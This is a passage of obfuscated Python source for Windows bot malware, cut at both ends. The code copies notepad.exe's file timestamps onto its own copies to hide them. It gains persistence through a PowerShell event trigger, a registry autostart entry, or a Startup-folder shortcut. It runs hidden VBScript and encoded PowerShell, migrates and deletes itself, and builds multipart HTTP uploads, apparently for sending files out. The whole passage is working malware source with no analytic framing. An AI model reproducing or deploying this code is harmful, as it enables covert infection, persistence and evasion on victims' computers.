		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyie,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyiD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDe


	@staticmethod
	def set_file_times(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyie,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyiD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDe):
		if not pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyie or not pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyiD or not pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDe:
			return False
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDi=ctypes.windll.kernel32.CreateFileW(unicode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziD),enum_GEN_WRITE,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyeQi,None,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyeiD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyeiQ,None)
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDi==pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyeDi:
			return False
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD=ctypes.windll.kernel32.SetFileTime(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDi,ctypes.byref(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyie),ctypes.byref(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDe),ctypes.byref(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyiD))
		ctypes.windll.kernel32.CloseHandle(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDi)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD


	@staticmethod
	def clone_file_times(src,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDezy):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyie,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyiD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDe=BotActionsKlass.get_file_times(src)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD=BotActionsKlass.set_file_times(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDezy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyie,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyiD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyDe)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD


	def clone_notepad_file_times(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDezy):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeyi=os_path.join(self.win_dir,'notepad.exe')
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD=BotActionsKlass.clone_file_times(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeyi,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQDezy)
		pass
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD


	@staticmethod
	def get_win_folder(folder_type):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD=ctypes.windll.shell32.SHGetFolderPathW
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD.argtypes=[ctypes.wintypes.HWND,ctypes.c_int,ctypes.wintypes.HANDLE,ctypes.wintypes.DWORD,ctypes.wintypes.LPCWSTR]
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyQ=ctypes.wintypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD(0,folder_type,0,0,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyQ)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyQ.value


	def copy_self(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyezD,target_name):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeyD=sys_argv[0]
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeiy=os_path.join(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyezD,target_name)
		if not os_path.exists(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyezD):
			os_mkdir(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyezD)
		shutil_copyfile(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeyD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeiy)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeiy


	def run_script(self,script_str,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeiD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('auto_delete',True)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeDy=tempfile_namedtemporaryfile(suffix='.vbs',delete=False)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeDi=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeDy.name
		with pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeDy as pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziye:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziye.write(script_str)
		subprocess_popen('wscript.exe /B /Nologo '+pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeDi,close_fds=True,creationflags=0x00000008)
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeiD:
			time_sleep(3)
			self.__delete_file(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeDi)


	def detect_pshell(self):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziey="exit 0"
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD=-1
		try:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD=subprocess_call("powershell.exe -windowstyle hidden -enc {0}".format(self.b64utfencode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziey)),creationflags=0x08000000)
		except Exception as e:
			pass
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD==0:
			return True
		return False


	def self_delete(self,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzieD='''set {rand_param1} = WScript.CreateObject("Scripting.FileSystemObject")\n'''
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzieD+='''{rand_param2} = "Wscript.ScriptFullName"\n'''
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzieD+='''Wscript.Sleep({randint})\n'''
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzieD+='''{rand_param1}.DeleteFile("{exe_path}")\n'''
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzieD+='''{rand_param1}.DeleteFile({rand_param2})\n'''
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziDy="Start-Sleep {randint};Remove-Item \"{exe_path}\""
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziDe=random_randint((botKlass.update_interval[1]+10)*1000,(botKlass.update_interval[1]+15)*1000)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDye=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('force',False)
		if self.detect_pshell():
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey=self.b64utfencode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziDy.format(randint=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziDe/1000,exe_path=sys_argv[0]))
			subprocess_popen("powershell.exe -windowstyle hidden -enc {0}".format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDiey),stdin=None,stdout=None,stderr=None,close_fds=True,creationflags=0x08000000,startupinfo=v_startup_info)
		else:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDey=id_generator(size=random_randint(3,8),chars=string_ascii_lowercase)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDei=id_generator(size=random_randint(3,8),chars=string_ascii_lowercase)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDiy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzieD.format(rand_param1=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDey,rand_param2=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDei,randint=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQziDe,exe_path=sys_argv[0])
			self.run_script(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDiy,auto_delete=False)
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDye:
			thread_interrupt_main()
		else:
			sys_exit(0)


	def create_lnk(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeiy,save_to,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDz):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDie='''set {rand_param} = WScript.CreateObject("WScript.Shell").CreateShortcut("{save_to}")\n'''
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDie+='''{rand_param}.TargetPath = "{target_path}"\n'''
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDie+='''{rand_param}.Save\n'''
		if not os_path.exists(save_to):
			os_mkdir(save_to)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzei=os_path.join(save_to,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDz)
		if os_path.exists(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzei):
			self.__delete_file(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzei)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzeD=id_generator(size=random_randint(2,6),chars=string_ascii_lowercase)
		self.run_script(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDie.format(rand_param=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzeD,target_path=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzeiy,save_to=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzei))
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzei


	def register_pshell_bind(self):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiy=self.copy_and_clone_time(self.win_dir,self.exe_name)
		try:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyziD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzDe=self.pshell_bind_trigger(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiy)
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD>0:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyziD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzDe=self.pshell_bind_trigger(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiy)
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD==0:
				return{'key':{'type':'trigger','filter_name':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyziD,'consumer_name':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzDe},'file':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiy}
		except Exception as e:
			pass
			self.__delete_file(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiy)


	def unregister_pshell_bind(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyziD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzDe):
		try:
			self.pshell_unbind_trigger(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyziD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzDe)
		except Exception as e:
			pass


	def register_legacy(self):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzDi=RegPersistenceKlass()
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyezi=os_path.join(self.local_appdata_dir,self.app_name)
		for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyezD in(self.win_dir,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyezi):
			try:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiy=self.copy_and_clone_time(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyezD,self.exe_name)
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeiz=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyzDi.add_autostart(self.app_name,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiy)
				return{'key':{'type':'reg','path':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeiz},'file':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiy}
			except:
				self.__delete_file(os_path.join(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyezD,self.exe_name))


	def register_appdata(self):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeiD=os_path.join(self.local_appdata_dir,self.app_name)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDe=self.exe_name
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDz=self.app_name+'.lnk'
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDi=self.copy_and_clone_time(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeiD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziyDe)
		self.create_lnk(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDi,self.startup_dir,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDz)
		return{'key':{'type':'dir','path':os_path.join(self.startup_dir,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDz)},'file':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDi}


	def register_tree(self):
		return_value=dict()
		for registration_type in (self.register_pshell_bind, self.register_legacy, self.register_appdata):
			try:
				return_value=registration_type()
				if return_value:
					return return_value
			except Exception as e:
				pass
		return return_value


	def register(self):
		return_value=self.register_tree()
		return return_value


	def unregister(self):
		if not botKlass.autoload_registered:
			return False
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize=botKlass.registered_settings
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize['key']['type']=='trigger':
			self.unregister_pshell_bind(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize['key']['filter_name'],pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize['key']['consumer_name'])
		elif pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize['key']['type']=='reg':
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyizD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize['key']['path']
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyiez=RegPersistenceKlass()
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyiez.del_value(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyizD['reg_type'],pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyizD['targ'],pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyizD['value_name'],pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyizD['bits'])
		else:
			try:
				self.__delete_file(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize['key']['path'])
				self.__delete_file(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyize['file'])
			except:
				pass


	def format_info(self):
		if botKlass.autoload_registered:
			v_return_message="Registered to autoload\n"
			v_return_message+="File path: {0}\n".format(botKlass.registered_settings['file'])
			if botKlass.registered_settings['key']['type']=='trigger':
				v_return_message+="Filter name: {0}".format(botKlass.registered_settings['key']['filter_name'])
				v_return_message+="Consumer name: {0}".format(botKlass.registered_settings['key']['consumer_name'])
			elif botKlass.registered_settings['key']['type']=='dir':
				v_return_message+="Startup dir with lnk: {0}\n".format(botKlass.registered_settings['key']['path'])
			elif botKlass.registered_settings['key']['type']=='reg':
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyiDz=botKlass.registered_settings['key']['path']
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy=None
				if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyiDz['reg_type']==HKLM:
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy='HKLM'
				elif pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyiDz['reg_type']==HKCU:
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy='HKCU'
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyiDe="{0}\{1}".format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeQy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyiDz['targ'])
				v_return_message+="Reg key: {0}\n".format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyiDe)
				v_return_message+="Value name: {0}\n Value data: {1}".format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyiDz['value_name'],pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyiDz['value_data'])
		else:
			v_return_message="Not registered to autoload"
		return v_return_message


class BotSelfActionsKlass(object):
	def __init__(self,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		self.app_name=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('app_name',botKlass.autoload_settings['app_name'])
		self.exe_name=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('exe_name',botKlass.autoload_settings['exe_name'])
		self.exe_path=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('exe_path',None)
		self.platform=v_sys_platform
		if self.platform=='win32':
			self.autoloader=BotActionsKlass(self.app_name,self.exe_name,exe_path=self.exe_path)


	def register(self,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDye=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.pop('force',False)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDez=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.pop('migrate',not bool(self.exe_path))
		if botKlass.autoload_registered and not pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzDye:
			return{'status':'error','message':'already_registered'}
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.autoloader.register()
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie:
			botKlass.registered_settings=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDi=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie.get('file',None)
			if(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDez or botKlass.autoload_settings['delete_after'])and os_path.exists(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDi):
				botKlass.save()
				self.self_migrate(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyeDi)
			return{'status':'ok','data':pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie}
		return{'status':'error','message':"Can't register"}


	def unregister(self):
		try:
			self.autoloader.unregister()
		except Exception as e:
			pass


	def self_migrate(self,path):
		try:
			process=subprocess_popen([path,'60'],close_fds=True,creationflags=0x00000008)
			if process.pid:
				self.self_delete(force=True)
				return True
		except Exception as e:
			pass
			return False


	def self_delete(self,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		self.autoloader.self_delete(**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ)


	def format_info(self):
		v_return_message=self.autoloader.format_info()
		return v_return_message


	def seppuku(self):
		botKlass.do_cleanup_dirs()
		self.unregister()
		botKlass.delete_settings_file()
		self.self_delete(force=True)


class HttpFormatKlass(object):

	def __init__(self):
		self.form_fields=[]
		self.files=[]
		self.boundary=str(id_generator(10))
		return


	def get_content_type(self):
		return 'multipart/form-data; boundary=%s'%self.boundary


	def add_field(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ):
		self.form_fields.append((pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ))
		return


	def add_file(self,fieldname,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziD,fileHandle):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei=fileHandle.read()
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDiz='application/octet-stream'
		self.files.append((fieldname,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDiz,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei))
		return


	def __str__(self):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDie=[]
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyi='--'+self.boundary
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDie.extend([pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyi,'Content-Disposition: form-data; name="%s"'%pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyD,'',pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ,]for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ in self.form_fields)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDie.extend([pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyi,'Content-Disposition: file; name="%s"; filename="%s"'%(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziD),'Content-Type: %s'%pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezDy,'',pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei,]for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeziD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezDy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei in self.files)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezDi=list(itertools_chain(*pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDie))
